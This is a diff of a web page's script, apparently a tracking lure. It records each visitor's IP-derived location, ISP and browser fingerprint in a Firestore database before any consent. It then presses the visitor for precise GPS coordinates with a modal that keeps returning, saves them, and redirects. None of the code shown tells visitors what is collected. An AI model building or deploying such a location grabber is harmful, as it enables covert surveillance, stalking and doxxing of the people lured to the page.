@@ -119,21 +119,24 @@ const db = getFirestore(app);
 const estado = document.getElementById("estado");
 
 // ---------- VARIABLES GLOBALES ----------
-let docId = null;               // ID del documento creado con los datos de IP
-let datosIP = {};               // objeto con los datos de la IP
-let ubicacionObtenida = false;  // para evitar redirigir dos veces
+let docId = null;
+let datosIP = {};
+let ubicacionObtenida = false;
+let solicitudEnProgreso = false; // para evitar múltiples solicitudes simultáneas
 
 // ---------- MOSTRAR / CERRAR MODAL ----------
-function mostrarAlerta(texto){
+function mostrarAlerta(texto) {
     document.getElementById("textoAlerta").textContent = texto;
     document.getElementById("miAlerta").style.display = "flex";
 }
 
-function cerrarAlerta(){
+function cerrarAlerta() {
     document.getElementById("miAlerta").style.display = "none";
-    // Al hacer clic en Aceptar, reintentamos obtener ubicación
-    if (!ubicacionObtenida) {
-        solicitarUbicacion();
+    if (!ubicacionObtenida && !solicitudEnProgreso) {
+        // Esperar un breve instante y reintentar
+        setTimeout(() => {
+            solicitarUbicacion();
+        }, 300);
     }
 }
 
@@ -166,38 +169,29 @@ async function obtenerDatosIP() {
     }
 }
 
-// ---------- GUARDAR DOCUMENTO INICIAL (solo IP y datos de navegador) ----------
+// ---------- GUARDAR DOCUMENTO INICIAL (IP + navegador) ----------
 async function guardarDatosIniciales() {
     try {
         const docRef = await addDoc(collection(db, "ubicaciones"), {
-            // Datos de IP
             ip: datosIP.ip,
             ciudad: datosIP.ciudad,
             region: datosIP.region,
             pais: datosIP.pais,
             proveedor: datosIP.proveedor,
             zonaHoraria: datosIP.zonaHoraria,
-
-            // Datos del navegador / dispositivo
             userAgent: navigator.userAgent,
             idioma: navigator.language,
             plataforma: navigator.platform,
             anchoPantalla: screen.width,
             altoPantalla: screen.height,
-
-            // Campos de ubicación (vacíos hasta que se obtenga GPS)
             lat: null,
             lon: null,
             precision: null,
-
-            // Timestamp de creación
             fecha: serverTimestamp(),
-            // Indicador de si se obtuvo ubicación
             ubicacion_obtenida: false
         });
-
         docId = docRef.id;
-        console.log("Documento inicial creado con ID:", docId);
+        console.log("Documento inicial creado ID:", docId);
         estado.textContent = "✅ Datos de IP guardados. Solicitando ubicación...";
         return true;
     } catch (error) {
@@ -207,7 +201,7 @@ async function guardarDatosIniciales() {
     }
 }
 
-// ---------- ACTUALIZAR DOCUMENTO CON UBICACIÓN ----------
+// ---------- ACTUALIZAR CON UBICACIÓN ----------
 async function actualizarConUbicacion(posicion) {
     if (!docId) {
         console.error("No hay docId para actualizar");
@@ -222,7 +216,7 @@ async function actualizarConUbicacion(posicion) {
             ubicacion_obtenida: true,
             fecha_ubicacion: serverTimestamp()
         });
-        console.log("Ubicación actualizada en el documento", docId);
+        console.log("Ubicación actualizada en documento", docId);
         return true;
     } catch (error) {
         console.error("Error al actualizar con ubicación:", error);
@@ -230,18 +224,22 @@ async function actualizarConUbicacion(posicion) {
     }
 }
 
-// ---------- SOLICITAR UBICACIÓN (con reintento) ----------
+// ---------- SOLICITAR UBICACIÓN (con manejo de permisos) ----------
 function solicitarUbicacion() {
     if (!navigator.geolocation) {
         mostrarAlerta("Tu navegador no soporta geolocalización.");
         return;
     }
 
+    // Evitar múltiples solicitudes simultáneas
+    if (solicitudEnProgreso) return;
+    solicitudEnProgreso = true;
+
     estado.textContent = "📍 Solicitando permiso de ubicación...";
 
     navigator.geolocation.getCurrentPosition(
         async function(posicion) {
-            // Éxito: actualizar el documento y redirigir
+            solicitudEnProgreso = false;
             ubicacionObtenida = true;
             estado.textContent = "📍 Ubicación obtenida, actualizando...";
             const actualizado = await actualizarConUbicacion(posicion);
@@ -254,10 +252,11 @@ function solicitarUbicacion() {
                 }, 2500);
             } else {
                 estado.textContent = "⚠️ No se pudo actualizar la ubicación.";
+                // Opcional: mostrar modal de error de guardado
             }
         },
         function(error) {
-            // Error: mostrar modal con el mensaje adecuado
+            solicitudEnProgreso = false;
             let mensaje = "";
             switch(error.code) {
                 case error.PERMISSION_DENIED:
@@ -272,7 +271,10 @@ function solicitarUbicacion() {
                 default:
                     mensaje = "Ocurrió un error desconocido.";
             }
-            mostrarAlerta(mensaje);
+            // Mostrar modal solo si la ubicación no se ha obtenido previamente
+            if (!ubicacionObtenida) {
+                mostrarAlerta(mensaje);
+            }
             estado.textContent = "⚠️ " + mensaje;
         },
         {
@@ -283,22 +285,46 @@ function solicitarUbicacion() {
     );
 }
 
+// ---------- VERIFICAR PERMISO DE UBICACIÓN ANTES DE SOLICITAR ----------
+async function verificarYActuar() {
+    // Si el navegador soporta la API de permisos, la usamos
+    if (navigator.permissions && navigator.permissions.query) {
+        try {
+            const permiso = await navigator.permissions.query({ name: 'geolocation' });
+            if (permiso.state === 'granted') {
+                // Ya tiene permiso → solicitar ubicación directamente
+                solicitarUbicacion();
+                return;
+            } else if (permiso.state === 'denied') {
+                // Permiso denegado → mostrar modal
+                mostrarAlerta("Activa la ubicación en los ajustes de tu navegador y luego haz clic en Aceptar.");
+                estado.textContent = "⚠️ Permiso de ubicación denegado.";
+                return;
+            }
+            // Si es 'prompt' (aún no decidido), se dejará que el navegador pregunte
+        } catch (e) {
+            console.warn("No se pudo consultar permisos, se procederá con la solicitud normal.");
+        }
+    }
+    // Si no se pudo verificar o el estado es prompt, solicitamos directamente
+    solicitarUbicacion();
+}
+
 // ---------- FLUJO PRINCIPAL ----------
 (async function main() {
     // 1. Obtener IP
     estado.textContent = "🌐 Obteniendo datos de IP...";
     datosIP = await obtenerDatosIP();
 
-    // 2. Guardar documento inicial con IP y datos de navegador
+    // 2. Guardar documento inicial
     const guardado = await guardarDatosIniciales();
     if (!guardado) {
-        // Si falla el guardado inicial, mostramos error y no continuamos
         estado.textContent = "⚠️ Error crítico al guardar. Recarga la página.";
         return;
     }
 
-    // 3. Solicitar ubicación (si se obtiene, actualiza el mismo documento)
-    solicitarUbicacion();
+    // 3. Verificar permiso y solicitar ubicación
+    await verificarYActuar();
 })();
 
 </script>
